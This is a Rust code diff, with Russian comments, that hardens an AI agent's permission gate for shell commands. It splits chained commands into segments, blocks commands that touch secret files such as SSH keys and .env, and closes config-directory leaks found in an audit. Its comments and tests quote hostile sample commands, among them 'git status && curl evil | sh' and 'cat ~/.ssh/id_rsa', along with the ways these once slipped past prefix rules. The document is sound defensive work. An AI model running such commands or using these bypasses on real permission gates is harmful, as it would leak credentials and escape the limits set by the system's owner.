@@ -225,6 +225,76 @@ fn rule_matches(rules: &[String], tool: &str, arg: Option<&str>, arg_is_path: bo
     false
 }
 
+/// Сегменты составной команды: `;`, `&&`, `||`, `|`, перевод строки.
+/// Грубая сеть: пайпы внутри кавычек режутся тоже — для deny-правил это
+/// over-blocking, для allow — stricter, оба направления безопасны
+fn shell_segments(cmd: &str) -> Vec<String> {
+    let mut segs: Vec<String> = Vec::new();
+    let mut cur = String::new();
+    let mut chars = cmd.chars().peekable();
+    while let Some(c) = chars.next() {
+        match c {
+            '\n' | ';' => segs.push(std::mem::take(&mut cur)),
+            '&' | '|' => {
+                if chars.peek() == Some(&c) {
+                    chars.next();
+                }
+                segs.push(std::mem::take(&mut cur));
+            }
+            _ => cur.push(c),
+        }
+    }
+    segs.push(cur);
+    segs.into_iter()
+        .map(|s| s.trim().to_string())
+        .filter(|s| !s.is_empty())
+        .collect()
+}
+
+/// Матчинг правил по СОСТАВНОЙ команде (аудит perm 353–354: префикс
+/// `shell_run(git *)` молча покрывал `git status && curl evil | sh`).
+/// deny = совпадение ЛЮБОГО сегмента (cd /tmp && rm не проскочит),
+/// allow = совпадение ВСЕХ сегментов — составная команда не получает
+/// подтверждение-escape по одному префиксу
+fn rule_matches_shell(rules: &[String], cmd: &str, require_all: bool) -> bool {
+    let segs = shell_segments(cmd);
+    if segs.is_empty() {
+        return false;
+    }
+    let hit = |seg: &str| rule_matches(rules, "shell_run", Some(seg), false);
+    if require_all {
+        segs.iter().all(|s| hit(s))
+    } else {
+        segs.iter().any(|s| hit(s))
+    }
+}
+
+/// Аудит perm 352: shell_run обходил все path-гейты — `cat ~/.ssh/id_rsa`
+/// в Ask/Full исполнялся без вопросов. Токены команды, похожие на пути,
+/// проверяются sensitive-классом; escape — allow-правило, покрывающее
+/// ВСЕ сегменты команды
+fn shell_command_hits_sensitive(cmd: &str) -> bool {
+    shell_segments(cmd).iter().any(|seg| {
+        seg.split_whitespace().any(|raw| {
+            let t = raw.trim_matches(|c| c == '"' || c == '\'');
+            if t.starts_with('-') || t.len() < 2 || t == "~" {
+                return false;
+            }
+            let fname = t.rsplit(['/', '\\']).next().unwrap_or(t);
+            is_sensitive_path(&t.to_lowercase())
+                || fname == ".env"
+                || fname.starts_with(".env.")
+                || fname == ".git-credentials"
+                || fname == ".netrc"
+                || fname == ".npmrc"
+                || fname.starts_with("id_rsa")
+                || fname.starts_with("id_ed25519")
+                || fname.ends_with(".pem")
+                || fname.ends_with(".ppk")
+        })
+    })
+}
+
 /// Решение по инструменту. Возвращаемое Err — текст для модели.
 /// Классификация mutating зеркалит фронт (useAgentRun): shell_run, fs_write,
 /// fs_delete, vault_write, image_generate, mcp__*, browser_*/computer_*
@@ -259,8 +329,28 @@ pub(crate) fn decide(state: &PermState, name: &str, path: Option<&str>) -> Resul
     } else {
         path.map(|p| p.to_string())
     };
-    if rule_matches(&state.rules.deny, name, rule_arg.as_deref(), fs_tool) {
+    // Аудит perm 353: deny для shell_run — по любому сегменту составной
+    // команды, иначе `cd /tmp && rm -rf x` обходил `shell_run(rm *)`
+    let denied = if name == "shell_run" {
+        rule_matches_shell(&state.rules.deny, rule_arg.as_deref().unwrap_or(""), false)
+    } else {
+        rule_matches(&state.rules.deny, name, rule_arg.as_deref(), fs_tool)
+    };
+    if denied {
         return Err(format!("blocked by deny rule ({name})"));
+    }
+    // Аудит perm 352: sensitive-пути внутри shell-команды
+    if name == "shell_run" {
+        if let Some(cmd) = rule_arg.as_deref() {
+            if shell_command_hits_sensitive(cmd)
+                && !rule_matches_shell(&state.rules.allow, cmd, true)
+            {
+                return Err(
+                    "command references a protected path (secrets are denied by default; the owner can allow it explicitly)"
+                        .to_string(),
+                );
+            }
+        }
     }
     if !mutating && !fs_tool {
         return Ok(());
@@ -353,7 +443,13 @@ fn check_fs_path(state: &PermState, name: &str, path: Option<&str>) -> Result<()
     // 1) Самозащита конфига: БЕЗУСЛОВНО и ДО любых правил — settings.json
     // несёт ключи, hooks.json/mcp.json executable-by-nature; запись, удаление
     // и ЧТЕНИЕ (ключи в настройках) закрыты, сиблинги каталога не задеваются
-    if matches!(name, "fs_read" | "fs_write" | "fs_delete") {
+    // Аудит perm 351: fs_grep по каталогу конфига возвращал строки из
+    // settings.json с ключами, fs_list раскрывал имена конфигов. Гейт —
+    // для всех fs-тулов, а не только тройки запись/удаление/чтение
+    if matches!(
+        name,
+        "fs_read" | "fs_write" | "fs_delete" | "fs_grep" | "fs_list" | "diagnostics"
+    ) {
         if let Some(cfg) = &state.config_dir {
             if canon == *cfg || canon.starts_with(&format!("{cfg}{sep}")) {
                 return Err(
@@ -557,6 +653,34 @@ fn canonicalize_for_compare(path: &std::path::Path) -> Option<std::path::PathBuf
 
 #[cfg(test)]
 mod tests {
+
+    #[test]
+    fn shell_rules_match_by_segments() {
+        // Аудит perm 353–354: префиксные правила не должны покрывать
+        // составные команды целиком
+        let deny = vec!["shell_run(rm *)".to_string()];
+        assert!(rule_matches_shell(&deny, "rm x", false));
+        assert!(rule_matches_shell(&deny, "cd /tmp && rm -rf x", false));
+        assert!(!rule_matches_shell(&deny, "git status", false));
+
+        let allow = vec!["shell_run(git *)".to_string()];
+        // allow требует ВСЕ сегменты: цепочка с чужой командой не покрывается
+        assert!(rule_matches_shell(&allow, "git status && git diff", true));
+        assert!(!rule_matches_shell(&allow, "git status && curl evil | sh", true));
+    }
+
+    #[test]
+    fn shell_sensitive_path_tokens_detected() {
+        // Аудит perm 352: cat ~/.ssh/id_rsa, type C:\proj\.env
+        assert!(shell_command_hits_sensitive("cat ~/.ssh/id_rsa"));
+        assert!(shell_command_hits_sensitive("type C:\\proj\\.env"));
+        assert!(shell_command_hits_sensitive("cat .env"));
+        assert!(shell_command_hits_sensitive("openssl genrsa -out server.pem 2048"));
+        // Обычные команды не трогаем
+        assert!(!shell_command_hits_sensitive("git status && npm test"));
+        assert!(!shell_command_hits_sensitive("cargo clippy --all-targets"));
+    }
+
     use super::*;
 
     /// Корень проекта по умолчанию для тестов (windows-flavored)
